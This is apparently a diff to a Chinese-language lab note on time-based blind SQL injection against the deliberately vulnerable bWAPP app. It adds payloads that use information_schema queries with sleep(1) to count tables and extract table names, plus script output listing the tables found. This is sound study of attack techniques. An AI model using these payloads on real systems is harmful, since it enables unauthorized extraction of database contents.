@@ -26,6 +26,28 @@ ascII 33 - 127
 Iron Man' and ascii(substr(database(),{},1))={} and sleep(1) --
 ```
 ![img.png](imgs/ascii码表.png)
+
+### 1.3 当前数据库表的个数
+```sql
+Iron Man' and (select count(table_name) from information_schema.TABLES where TABLE_SCHEMA = database()) = 1 and sleep(1) --
+```
+
+### 1.4 当前数据库  各个表 的名字 的长度
+```sql
+Iron Man' and (select length(table_name) from information_schema.TABLES where TABLE_SCHEMA = database() limit 1,1) = 1 and sleep(1) -- 
+```
+
+### 1.5 获取每张表的名称
+```sql
+substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),2,1);
+```
+![img.png](imgs/select_substr().png)
+
+
+### 1.6 获取 USERS 表中所有字段
+
+
+
 ### 2 编写 python 脚本
 
 ```python
@@ -79,4 +101,15 @@ get_database_name(get_database_name_length())
 长度为5
 bWAPP
 进程已结束,退出代码0
+
+表个数为5
+
+表0长度为4
+表1长度为6
+表2长度为6
+表3长度为5
+表4长度为8
+
+进程已结束,退出代码0
 ```
+![img.png](imgs/time-based-sqli-bwapptables.png)
